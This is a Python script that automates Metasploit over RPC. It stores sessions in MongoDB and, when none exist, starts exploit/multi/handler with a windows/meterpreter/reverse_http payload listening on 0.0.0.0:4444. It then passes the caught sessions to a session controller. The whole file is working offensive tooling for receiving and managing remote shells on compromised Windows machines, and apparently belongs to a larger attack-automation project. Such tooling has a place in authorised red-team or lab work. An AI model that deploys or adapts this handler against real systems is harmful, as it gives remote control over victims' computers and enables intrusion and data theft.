#!/usr/bin/env python3

from msfrpcdHandler import msfrpcdHandler
from pymetasploit3.msfrpc import MsfRpcError, MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole
from connectMsfRpcClient import connectMsfRpcClient
from sessionMod import sessionMod
from mongo_setup import global_init
import data.data_services as svc
from data.session import Session
from data.event import EventUtils
import sys
import time
import random

class msfAutomation:
    choose_payload = ['windows/meterpreter/reverse_http']
    def __init__(self, msfclient):
        self.msfclient = msfclient
        # starting mongo
        global_init()
        # clearing sessions for new sessions
        svc.deleteSessions()

        print("[!]Starting Automation...")
        EventUtils.settingEvent(self, "Starting automation!")
        msfrpcdHandler()
        if self.msfclient.connect() is False:
            sys.exit()
        
        sessionMod(self.msfclient).sessionPrint() # NEED TO IMPROVE THIS

        session = Session.objects()
        if session:
            sessionMod(self.msfclient).activeSessionController()
        else:
            print("[!]Running exploit: exploit/multi/handler")
            exploit = self.msfclient.client.modules.use('exploit', 'exploit/multi/handler')
            time.sleep(5)
            exploit['ExitOnSession'] = False
            time.sleep(2)
            randomPayload = random.choice(self.choose_payload)
            print("[!]Using payload: ", randomPayload)
            _payload = self.msfclient.client.modules.use('payload', randomPayload)
            time.sleep(2)
            _payload['LHOST'] = '0.0.0.0'
            _payload['LPORT'] = '4444'
            time.sleep(5)
            exploit.execute(payload=_payload)
            print("[!]Executing exploit on port ", _payload['LPORT'])
            time.sleep(10)
            sessionMod(self.msfclient).activeSessionController()
